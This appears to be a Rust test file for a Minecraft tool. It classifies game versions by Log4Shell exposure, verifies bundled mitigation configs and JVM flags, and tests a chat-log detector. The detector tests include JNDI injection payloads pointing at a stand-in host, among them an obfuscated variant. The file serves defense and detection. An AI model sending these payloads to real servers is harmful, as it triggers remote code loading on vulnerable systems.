use super::*;

#[test]
fn ranges() {
    assert_eq!(exposure("1.6.4"), Exposure::Unaffected);
    assert_eq!(exposure("1.7.10"), Exposure::Legacy);
    assert_eq!(exposure("1.11.2"), Exposure::Legacy);
    assert_eq!(exposure("1.12"), Exposure::Mid);
    assert_eq!(exposure("1.12.2"), Exposure::Mid);
    assert_eq!(exposure("1.16.5"), Exposure::Mid);
    assert_eq!(exposure("1.16.5-rc1"), Exposure::Mid);
    assert_eq!(exposure("1.17"), Exposure::JvmOption);
    assert_eq!(exposure("1.17.1"), Exposure::JvmOption);
    assert_eq!(exposure("1.18"), Exposure::JvmOption);
    assert_eq!(exposure("1.18-pre1"), Exposure::JvmOption);
    assert_eq!(exposure("1.18.1"), Exposure::Fixed);
    assert_eq!(exposure("1.18.2"), Exposure::Fixed);
    assert_eq!(exposure("1.21.4"), Exposure::Fixed);
    assert_eq!(exposure("21w44a"), Exposure::JvmOption);
    assert_eq!(exposure("20w14a"), Exposure::Mid);
    assert_eq!(exposure("20w45a"), Exposure::JvmOption);
    assert_eq!(exposure("16w02a"), Exposure::Legacy);
    assert_eq!(exposure("22w03a"), Exposure::Fixed);
    assert_eq!(exposure("1.12.2-forge-14.23.5.2860"), Exposure::Mid);
    assert_eq!(exposure("fabric-loader-0.14.21-1.16.5"), Exposure::Mid);
    assert_eq!(exposure("unbekannt"), Exposure::JvmOption);
    assert!(exposure("1.8.9").vulnerable());
    assert!(!exposure("1.20.1").vulnerable());
}

#[test]
fn configs() {
    assert_eq!(server_config("1.8.9"), Some(CONFIG_17_111));
    assert_eq!(server_config("1.16.5"), Some(CONFIG_112_116));
    assert_eq!(server_config("1.17.1"), None);
    assert_eq!(server_config("1.20.1"), None);
    assert!(CONFIG_17_111.url.contains(CONFIG_17_111.sha1) && CONFIG_17_111.url.ends_with(CONFIG_17_111.file));
    for c in [CONFIG_17_111, CONFIG_112_116] {
        assert_eq!(sha1_hex(c.bundled), c.sha1, "{}", c.file);
        assert_eq!(c.bundled.len() as u64, c.size);
        let xml = std::str::from_utf8(c.bundled).unwrap();
        // 1.12–1.16.5: `%msg{nolookups}`; 1.7–1.11.2: RegexFilter verwirft Zeilen mit `${…}` ganz
        assert!(xml.contains("%msg{nolookups}") || xml.contains("RegexFilter"), "{}", c.file);
    }
    assert!(CONFIG_112_116.url.contains(CONFIG_112_116.sha1) && CONFIG_112_116.url.ends_with(CONFIG_112_116.file));
}

#[test]
fn args() {
    let p = Path::new("/c/log4j2_112-116.xml");
    assert_eq!(server_args(&[], Some(p)), vec![NO_LOOKUPS.to_string(), "-Dlog4j.configurationFile=/c/log4j2_112-116.xml".to_string()]);
    assert_eq!(server_args(&[], None), vec![NO_LOOKUPS.to_string()]);
    // Eigene Config des Nutzers bleibt, nur die JVM-Option kommt dazu
    let own = vec!["-Dlog4j.configurationFile=mine.xml".to_string()];
    assert_eq!(server_args(&own, Some(p)), vec![NO_LOOKUPS.to_string()]);
    // Schon gesetzt → nichts doppelt
    let both = vec![NO_LOOKUPS.to_string(), "-Dlog4j.configurationFile=mine.xml".to_string()];
    assert!(server_args(&both, Some(p)).is_empty());
}

#[test]
fn detects() {
    let a = detect("[12:00:00] [Server thread/INFO]: <Griefer> ${jndi:ldap://evil.example:1389/a}").unwrap();
    assert_eq!(a.player.as_deref(), Some("Griefer"));
    assert_eq!(a.target.as_deref(), Some("ldap://evil.example:1389/a"));
    assert!(a.message().contains("Griefer") && !a.message().contains("${"));
    // Groß/klein und verschleiert
    assert!(detect("[Not Secure] <Bob> ${JNDI:rmi://x}").is_some());
    let b = detect("<Eve> ${${lower:j}${::-n}di:${lower:l}dap://h/x}").unwrap();
    assert_eq!(b.player.as_deref(), Some("Eve"));
    assert_eq!(b.target.as_deref(), Some("ldap://h/x"));
    assert!(detect("[Render thread/INFO]: [CHAT] ${jndi:dns://x}").is_some());
    // Harmlos
    let c = detect("[12:00:00 INFO]: Griefer (/1.2.3.4:5555) lost connection: ${jndi:ldap://x}").unwrap();
    assert_eq!(c.player.as_deref(), Some("Griefer"));
    assert!(detect("<Alex> hallo ${name} und jndi").is_none());
    assert!(detect("Done (3.2s)! For help, type \"help\"").is_none());
}

#[test]
fn watch_limits() {
    let mut w = Watch::default();
    assert!(w.check("harmlos").is_empty());
    for _ in 0..9 {
        assert_eq!(w.check("<a> ${jndi:ldap://x}").len(), 1);
    }
    assert_eq!(w.check("<a> ${jndi:ldap://x}").len(), 2);
    assert!(w.check("<a> ${jndi:ldap://x}").is_empty());
}
